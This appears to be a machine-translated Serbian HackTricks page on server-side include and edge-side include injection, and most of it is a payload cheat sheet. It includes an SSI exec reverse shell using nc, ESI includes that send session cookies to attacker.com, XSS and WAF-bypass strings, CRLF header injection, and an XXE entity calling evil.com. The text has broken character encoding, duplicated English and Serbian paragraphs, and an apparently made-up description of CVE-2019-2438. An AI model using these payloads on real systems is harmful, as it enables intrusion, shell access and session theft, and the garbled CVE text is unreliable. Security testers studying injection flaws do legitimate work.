# Ubacivanje sa servera/Ubacivanje sa ivice servera

<details>

<summary><strong>Nau캜ite hakovanje AWS-a od nule do heroja sa</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Drugi na캜ini podr코ke HackTricks-u:

* Ako 쬰lite da vidite **va코u kompaniju reklamiranu na HackTricks-u** ili **preuzmete HackTricks u PDF formatu** proverite [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Nabavite [**zvani캜ni PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Otkrijte [**The PEASS Family**](https://opensea.io/collection/the-peass-family), na코u kolekciju ekskluzivnih [**NFT-ova**](https://opensea.io/collection/the-peass-family)
* **Pridru쬴te se** 游눫 [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili nas **pratite** na **Twitter-u** 游냕 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Podelite svoje hakovanje trikove slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.

</details>

## Osnovne informacije o ubacivanju sa servera

**(Uvod preuzet sa [Apache dokumentacije](https://httpd.apache.org/docs/current/howto/ssi.html))**

SSI (Server Side Includes) su direktive koje se **postavljaju u HTML stranicama i evaluiraju na serveru** dok se stranice serviraju. Omogu캖avaju vam da **dodajete dinami캜ki generisani sadr쬬j** postoje캖oj HTML stranici, bez potrebe da celu stranicu servirate putem CGI programa ili neke druge dinami캜ke tehnologije.\
Na primer, mo쬰te postaviti direktivu u postoje캖u HTML stranicu, kao 코to je:

`<!--#echo var="DATE_LOCAL" -->`

I, kada se stranica servira, ovaj fragment 캖e biti evaluiran i zamenjen svojom vredno코캖u:

`Utorak, 15-Jan-2013 19:28:54 EST`

Odluka o tome kada koristiti SSI, a kada imati celu stranicu generisanu nekim programom, obi캜no je pitanje koliko je stranica stati캜na, a koliko treba ponovo izra캜unavati svaki put kada se stranica servira. SSI je odli캜an na캜in da se dodaju male informacije, kao 코to je trenutno vreme - prikazano iznad. Ali ako ve캖ina va코e stranice bude generisana u trenutku kada se servira, trebate potra쬴ti neko drugo re코enje.

Mo쬰te zaklju캜iti da postoji SSI ako web aplikacija koristi fajlove sa ekstenzijama \*\* `.shtml`, `.shtm` ili `.stm`\*\*, ali to nije jedini slu캜aj.

Tipi캜an SSI izraz ima slede캖i format:
```
<!--#directive param="value" -->
```
### Provera

Da biste proverili da li je ciljni veb server podlo쬬n server-side inclusion (SSI) ili edge-side inclusion (ESI) ubrizgavanju, mo쬰te koristiti slede캖e metode:

#### 1. Testiranje SSI ubrizgavanja

Da biste proverili da li je ciljni veb server podlo쬬n SSI ubrizgavanju, mo쬰te koristiti slede캖i payload:

```plaintext
<!--#exec cmd="ls" -->
```

Ako se rezultat izvr코avanja komande `ls` prika쬰 na stranici, to ukazuje na ranjivost na SSI ubrizgavanje.

#### 2. Testiranje ESI ubrizgavanja

Da biste proverili da li je ciljni veb server podlo쬬n ESI ubrizgavanju, mo쬰te koristiti slede캖i payload:

```plaintext
<esi:include src="http://attacker.com/malicious.xml" />
```

Ako se sadr쬬j `malicious.xml` fajla prika쬰 na stranici, to ukazuje na ranjivost na ESI ubrizgavanje.

#### 3. Testiranje kombinovanog SSI i ESI ubrizgavanja

Da biste proverili da li je ciljni veb server podlo쬬n kombinovanom SSI i ESI ubrizgavanju, mo쬰te koristiti slede캖i payload:

```plaintext
<!--#exec cmd="curl http://attacker.com/malicious.xml" -->
```

Ako se sadr쬬j `malicious.xml` fajla prika쬰 na stranici, to ukazuje na ranjivost na kombinovano SSI i ESI ubrizgavanje.

#### 4. Automatizovano testiranje

Mo쬰te koristiti alate poput `ssishell` ili `esi_scan` za automatizovano testiranje SSI i ESI ubrizgavanja. Ovi alati 캖e vam pomo캖i da identifikujete ranjivosti i izvr코ite dalje testove.
```javascript
// Document name
<!--#echo var="DOCUMENT_NAME" -->
// Date
<!--#echo var="DATE_LOCAL" -->

// File inclusion
<!--#include virtual="/index.html" -->
// Including files (same directory)
<!--#include file="file_to_include.html" -->
// CGI Program results
<!--#include virtual="/cgi-bin/counter.pl" -->
// Including virtual files (same directory)
<!--#include virtual="file_to_include.html" -->
// Modification date of a file
<!--#flastmod file="index.html" -->

// Command exec
<!--#exec cmd="dir" -->
// Command exec
<!--#exec cmd="ls" -->
// Reverse shell
<!--#exec cmd="mkfifo /tmp/foo;nc <PENTESTER IP> <PORT> 0</tmp/foo|/bin/bash 1>/tmp/foo;rm /tmp/foo" -->

// Print all variables
<!--#printenv -->
// Setting variables
<!--#set var="name" value="Rich" -->

```
## Edge Side Inclusion

Postoji problem sa **ke코iranjem informacija ili dinami캜kih aplikacija** jer se deo sadr쬬ja mo쬰 **promeniti** do slede캖eg puta kada se sadr쬬j preuzme. To je ono 코to se koristi **ESI** kako bi se ozna캜io dinami캜ki sadr쬬j koji treba generisati pre slanja ke코irane verzije.\
Ako **napada캜** uspe da **ubaci ESI oznaku** unutar ke코iranog sadr쬬ja, onda bi mogao da **ubaci proizvoljni sadr쬬j** u dokument pre nego 코to ga po코alje korisnicima.

### Detekcija ESI-a

Slede캖i **header** u odgovoru sa servera zna캜i da server koristi ESI:
```
Surrogate-Control: content="ESI/1.0"
```
Ako ne mo쬰te prona캖i ovaj zaglavlje, server **mo쬯a i dalje koristi ESI**.\
Tako캠e se mo쬰 koristiti **slepa eksploatacijska metoda** jer bi zahtev trebao sti캖i na server napada캜a:
```javascript
// Basic detection
hell<!--esi-->o
// If previous is reflected as "hello", it's vulnerable

// Blind detection
<esi:include src=http://attacker.com>

// XSS Exploitation Example
<esi:include src=http://attacker.com/XSSPAYLOAD.html>

// Cookie Stealer (bypass httpOnly flag)
<esi:include src=http://attacker.com/?cookie_stealer.php?=$(HTTP_COOKIE)>

// Introduce private local files (Not LFI per se)
<esi:include src="supersecret.txt">

// Valid for Akamai, sends debug information in the response
<esi:debug/>
```
### ESI eksploatacija

[GoSecure je kreirao](https://www.gosecure.net/blog/2018/04/03/beyond-xss-edge-side-include-injection/) tabelu kako bi razumeli mogu캖e napade koje mo쬰mo poku코ati protiv razli캜itog softvera koji podr쬬va ESI, u zavisnosti od podr쬬ne funkcionalnosti:

* **Includes**: Podr쬬va direktivu `<esi:includes>`
* **Vars**: Podr쬬va direktivu `<esi:vars>`. Korisno za zaobila쬰nje XSS filtera
* **Cookie**: Kola캜i캖i dokumenta su dostupni ESI ma코ini
* **Upstream Headers Required**: Surrogate aplikacije ne캖e obra캠ivati ESI izjave osim ako izvorna aplikacija ne obezbedi zaglavlja
* **Host Allowlist**: U ovom slu캜aju, ESI uklju캜ivanje je mogu캖e samo sa dozvoljenih servera, 코to 캜ini SSRF, na primer, mogu캖im samo protiv tih servera

|         **Softver**         | **Includes** | **Vars** | **Cookies** | **Upstream Headers Required** | **Host Whitelist** |
| :--------------------------: | :----------: | :------: | :---------: | :---------------------------: | :----------------: |
|            Squid3            |     Da     |    Da   |     Da     |              Da              |         Ne         |
|         Varnish Cache        |     Da     |    Ne    |      Ne     |              Da              |         Da        |
|            Fastly            |     Da     |    Ne    |      Ne     |               Ne              |         Da        |
| Akamai ESI Test Server (ETS) |     Da     |    Da   |     Da     |               Ne              |         Ne         |
|          NodeJS esi          |     Da     |    Da   |     Da     |               Ne              |         Ne         |
|         NodeJS nodesi        |     Da     |    Ne    |      Ne     |               Ne              |      Opciono      |

#### XSS

Slede캖a ESI direktiva 캖e u캜itati proizvoljni fajl unutar odgovora servera.
```xml
<esi:include src=http://attacker.com/xss.html>
```
#### Zaobila쬰nje za코tite od XSS napada na klijentskoj strani

In some cases, web applications implement client-side XSS protection mechanisms to prevent the execution of malicious scripts. However, these protections can sometimes be bypassed using various techniques.

U nekim slu캜ajevima, veb aplikacije implementiraju mehanizme za코tite od XSS napada na klijentskoj strani kako bi spre캜ile izvr코avanje zlonamernih skripti. Me캠utim, ove za코tite ponekad mogu biti zaobi캠ene kori코캖enjem razli캜itih tehnika.

One common technique is to encode or obfuscate the payload in a way that it bypasses the client-side XSS filters. This can be done by using different encoding techniques such as URL encoding, HTML entity encoding, or JavaScript escaping.

Jedna uobi캜ajena tehnika je enkodiranje ili obfuskacija payloada na na캜in koji zaobilazi filtere za코tite od XSS napada na klijentskoj strani. Ovo se mo쬰 posti캖i kori코캖enjem razli캜itih tehnika enkodiranja kao 코to su enkodiranje URL-a, enkodiranje HTML entiteta ili eskapiranje JavaScript koda.

Another technique is to use alternative syntax or characters that are not recognized by the client-side XSS filters. This can include using different HTML tags, attributes, or event handlers that are not commonly used or recognized by the filters.

Jo코 jedna tehnika je kori코캖enje alternativne sintakse ili karaktera koji nisu prepoznati od strane filtera za코tite od XSS napada na klijentskoj strani. Ovo mo쬰 uklju캜ivati kori코캖enje razli캜itih HTML tagova, atributa ili event handlera koji nisu 캜esto kori코캖eni ili prepoznati od strane filtera.

It is important to note that bypassing client-side XSS protection mechanisms should only be done for ethical hacking purposes and with proper authorization. Unauthorized bypassing of these protections is illegal and unethical.

Va쬹o je napomenuti da zaobila쬰nje mehanizama za코tite od XSS napada na klijentskoj strani treba vr코iti samo u eti캜ke svrhe i uz odgovaraju캖u autorizaciju. Neovla코캖eno zaobila쬰nje ovih za코tita je ilegalno i neeti캜no.
```xml
x=<esi:assign name="var1" value="'cript'"/><s<esi:vars name="$(var1)"/>>alert(/Chrome%20XSS%20filter%20bypass/);</s<esi:vars name="$(var1)"/>>

Use <!--esi--> to bypass WAFs:
<scr<!--esi-->ipt>aler<!--esi-->t(1)</sc<!--esi-->ript>
<img+src=x+on<!--esi-->error=ale<!--esi-->rt(1)>
```
#### Kra캠a kola캜i캖a

* Udaljena kra캠a kola캜i캖a
```xml
<esi:include src=http://attacker.com/$(HTTP_COOKIE)>
<esi:include src="http://attacker.com/?cookie=$(HTTP_COOKIE{'JSESSIONID'})" />
```
* Ukradi kola캜i캖 HTTP\_ONLY pomo캖u XSS-a reflektiraju캖i ga u odgovoru:
```bash
# This will reflect the cookies in the response
<!--esi $(HTTP_COOKIE) -->
# Reflect XSS (you can put '"><svg/onload=prompt(1)>' URL encoded and the URL encode eveyrhitng to send it in the HTTP request)
<!--esi/$url_decode('"><svg/onload=prompt(1)>')/-->

# It's possible to put more complex JS code to steal cookies or perform actions
```
#### Privatna lokalna datoteka

Nemojte me코ati ovo sa "Uklju캜ivanjem lokalne datoteke":
```markup
<esi:include src="secret.txt">
```
#### CRLF

CRLF (Carriage Return Line Feed) predstavlja specifi캜an karakterni niz koji se koristi za ozna캜avanje kraja reda u tekstualnim datotekama. Sastoji se od kombinacije karaktera "Carriage Return" (CR) i "Line Feed" (LF). CR karakter ozna캜ava povratak kursora na po캜etak reda, dok LF karakter ozna캜ava prelazak na slede캖i red.

CRLF se 캜esto koristi u HTTP protokolu za ozna캜avanje kraja zaglavlja HTTP zahteva ili odgovora. Me캠utim, zlonamerni korisnici mogu iskoristiti CRLF ranjivosti kako bi izvr코ili razli캜ite vrste napada, kao 코to su HTTP Response Splitting i Server-Side Request Forgery (SSRF).

Napada캜 mo쬰 ubaciti CRLF karaktere u HTTP zahtev kako bi izazvao ne쬰ljene efekte, kao 코to su ubacivanje dodatnih zaglavlja ili preusmeravanje korisnika na zlonamerni sajt. Ovi napadi mogu dovesti do kra캠e podataka, preuzimanja kontrolu nad serverom ili izvr코avanja proizvoljnog koda.

Da biste se za코titili od CRLF injekcija, preporu캜uje se sanitizacija i validacija svih korisni캜kih unosa koji se koriste u HTTP zahtevima. Tako캠e je va쬹o a쬿rirati sve softverske komponente koje obra캠uju HTTP zahteve kako bi se ispravile poznate ranjivosti.
```markup
<esi:include src="http://anything.com%0d%0aX-Forwarded-For:%20127.0.0.1%0d%0aJunkHeader:%20JunkValue/"/>
```
#### Otvoreno preusmeravanje

Slede캖i kod 캖e dodati `Location` zaglavlje odgovoru.
```bash
<!--esi $add_header('Location','http://attacker.com') -->
```
#### Dodavanje zaglavlja

* Dodajte zaglavlje u prisilnom zahtevu
```xml
<esi:include src="http://example.com/asdasd">
<esi:request_header name="User-Agent" value="12345"/>
</esi:include>
```
* Dodaj zaglavlje u odgovor (korisno za zaobila쬰nje "Content-Type: text/json" u odgovoru sa XSS)
```bash
<!--esi/$add_header('Content-Type','text/html')/-->

<!--esi/$(HTTP_COOKIE)/$add_header('Content-Type','text/html')/$url_decode($url_decode('"><svg/onload=prompt(1)>'))/-->

# Check the number of url_decode to know how many times you can URL encode the value
```
#### CRLF u dodavanju zaglavlja (**CVE-2019-2438)**

CRLF (Carriage Return Line Feed) injekcija je vrsta ranjivosti koja omogu캖ava napada캜u da ubaci dodatne zaglavlja u HTTP odgovor. Ova ranjivost mo쬰 biti iskori코캖ena za izvr코avanje razli캜itih napada, uklju캜uju캖i i Edge Side Inclusion (ESI) injekciju.

CVE-2019-2438 je specifi캜na ranjivost koja se odnosi na CRLF injekciju u funkciji dodavanja zaglavlja u Oracle WebLogic Serveru. Napada캜 mo쬰 iskoristiti ovu ranjivost da ubaci zlonamerni kod u HTTP odgovor i izvr코i proizvoljan kod na ciljnom serveru.

Da bi se iskoristila ova ranjivost, napada캜 mora da ubaci CRLF sekvencu (Carriage Return i Line Feed) u vrednost zaglavlja koje se dodaje. Ovo mo쬰 biti postignuto kori코캖enjem specijalnih karaktera poput "%0d" i "%0a". Kada se ova sekvencija ubaci u zaglavlje, server 캖e je tuma캜iti kao kraj linije i sve 코to sledi 캖e biti smatrano kao novo zaglavlje.

Da bi se spre캜ila CRLF injekcija, preporu캜uje se validacija i sanitizacija svih korisni캜kih unosa koji se koriste za formiranje zaglavlja. Tako캠e je va쬹o a쬿rirati softver na najnoviju verziju kako bi se ispravile poznate ranjivosti.

CVE-2019-2438 je ozbiljna ranjivost koja mo쬰 dovesti do kompromitovanja ciljnog servera. Stoga je va쬹o preduzeti odgovaraju캖e mere za코tite kako bi se spre캜ilo iskori코캖avanje ove ranjivosti.
```xml
<esi:include src="http://example.com/asdasd">
<esi:request_header name="User-Agent" value="12345
Host: anotherhost.com"/>
</esi:include>
```
#### Akamai debug

Ovo 캖e poslati informacije za debagiranje uklju캜ene u odgovor:
```xml
<esi:debug/>
```
### ESI + XSLT = XXE

Specifikacijom vrednosti `xslt` za parametar _dca_, mogu캖e je uklju캜iti **`eXtensible Stylesheet Language Transformations (XSLT)`** bazirani ESI. Uklju캜ivanje uzrokuje da HTTP surrogate preuzme XML i XSLT fajlove, pri 캜emu XSLT filtrira XML fajl. Takvi XML fajlovi su podlo쬹i _XML External Entity (XXE)_ napadima, omogu캖avaju캖i napada캜ima da izvr코e SSRF napade. Me캠utim, korisnost ovog pristupa je ograni캜ena jer ESI uklju캜ivanje ve캖 slu쬴 kao SSRF vektor. Zbog nedostatka podr코ke u osnovnoj Xalan biblioteci, eksterni DTD-ovi se ne procesiraju, 코to spre캜ava ekstrakciju lokalnih fajlova.
```xml
<esi:include src="http://host/poc.xml" dca="xslt" stylesheet="http://host/poc.xsl" />
```
XSLT datoteka:
```xml
<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE xxe [<!ENTITY xxe SYSTEM "http://evil.com/file" >]>
<foo>&xxe;</foo>
```
Proverite XSLT stranicu:

{% content-ref url="xslt-server-side-injection-extensible-stylesheet-language-transformations.md" %}
[xslt-server-side-injection-extensible-stylesheet-language-transformations.md](xslt-server-side-injection-extensible-stylesheet-language-transformations.md)
{% endcontent-ref %}

### Reference

* [https://www.gosecure.net/blog/2018/04/03/beyond-xss-edge-side-include-injection/](https://www.gosecure.net/blog/2018/04/03/beyond-xss-edge-side-include-injection/)
* [https://www.gosecure.net/blog/2019/05/02/esi-injection-part-2-abusing-specific-implementations/](https://www.gosecure.net/blog/2019/05/02/esi-injection-part-2-abusing-specific-implementations/)
* [https://academy.hackthebox.com/module/145/section/1304](https://academy.hackthebox.com/module/145/section/1304)
* [https://infosecwriteups.com/exploring-the-world-of-esi-injection-b86234e66f91](https://infosecwriteups.com/exploring-the-world-of-esi-injection-b86234e66f91)

## Lista za otkrivanje Brute-Force napada

{% embed url="https://github.com/carlospolop/Auto_Wordlists/blob/main/wordlists/ssi_esi.txt" %}

<details>

<summary><strong>Nau캜ite hakovanje AWS-a od nule do heroja sa</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Drugi na캜ini podr코ke HackTricks-u:

* Ako 쬰lite da vidite **va코u kompaniju ogla코enu u HackTricks-u** ili **preuzmete HackTricks u PDF formatu** proverite [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Nabavite [**zvani캜ni PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Otkrijte [**The PEASS Family**](https://opensea.io/collection/the-peass-family), na코u kolekciju ekskluzivnih [**NFT-ova**](https://opensea.io/collection/the-peass-family)
* **Pridru쬴te se** 游눫 [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili nas **pratite** na **Twitter-u** 游냕 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Podelite svoje hakovanje trikove slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.

</details>
